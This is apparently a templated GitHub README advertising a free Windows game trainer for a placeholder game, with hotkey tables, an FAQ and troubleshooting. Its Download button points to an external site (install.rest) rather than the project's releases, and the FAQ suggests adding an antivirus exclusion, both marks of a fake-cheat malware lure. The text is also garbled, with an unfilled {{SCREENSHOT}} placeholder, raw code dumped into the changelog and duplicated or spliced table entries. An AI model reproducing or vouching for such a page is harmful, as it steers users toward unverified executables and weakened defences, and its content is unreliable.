<div align="center">

# Test-Org123123200 — Trainer

**Boost your gameplay with instant power-ups and unlimited resources**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-a1b2c3?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-20%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="{{SCREENSHOT}}" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Test-Org123123200’s latest trainer gives players the ability to tweak game mechanics on the fly, from health and ammo to speed and difficulty settings. It’s perfect for testing, learning, and mastering every aspect of the game.

Whether you’re a solo player looking to experiment or a developer needing a reliable tool for QA, this trainer offers a stable, user-friendly interface that integrates seamlessly with the game’s core systems.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Unlimited Health | `F1` | Instantly set your health to maximum and keep it there, regardless of damage taken. |
| Infinite Ammo | `F2` | Never run out of bullets or projectiles; your weapon always stays fully loaded. |
| Speed Hack | `F3` | Adjust character movement speed from 0.5x to 5x in real time, enabling fast traversal or slow-motion combat scenarios. |
| Health Multiplier | slider | `1x`–`50x`, default `3x` |
| Speed Multiplier | slider | `0%`–`100%` — the softer alternative to slider2 |
| Enable AI Crew `crew` | `F4` | Activate a virtual crew that assists with tasks and combats, mimicking real teammates in single-player mode. |
| Bypass Anti-Cheat `bypass` | `F5` | Temporarily disable anti-cheat checks for a smoother debugging experience during development. |
| Auto-Save `save` | — | Automatically save game progress at set intervals to prevent data loss during testing. |
| Unlock all Unlock All Levels | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`crew`**: changes the shared session · **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`EA`**: unfinished Early Access system · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Use the speed hack to quickly navigate to hidden areas and discover secret content.

> [!WARNING]
> Using this trainer in multiplayer or online modes may result in account restrictions. Use only in single-player or offline environments.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Will using this trainer get me banned?, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>Is the trainer safe to use?</summary>
Yes, the trainer is designed for development and testing purposes. It does not alter any game files permanently and can be disabled at any time.
</details>

<details>
<summary>Can I use the trainer with the latest game patch?</summary>
The trainer is regularly updated to stay compatible with new patches. Check the version number before use.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Some features may not work as expected options do nothing | That memory allocates only in when the game is updated or when conflicting mods are active. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| the trainer may crash or freeze the game | Update the trainer to the latest version and disable conflicting mods |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 11 Sep 2026 — first release. 20+ options across ['Features', 'Settings', 'FAQ']. {'Health Multiplier': 1.0, 'Speed Multiplier': 1.0, 'Auto-Save': True, 'Enable AI Crew': False}

<!-- One line per release. Do not invent a version history — the Releases tab
     is one click away and an empty one under a long changelog reads badly. -->

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Test-Org123123200, Test-Org123123200 or Valve. Test-Org123123200 and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
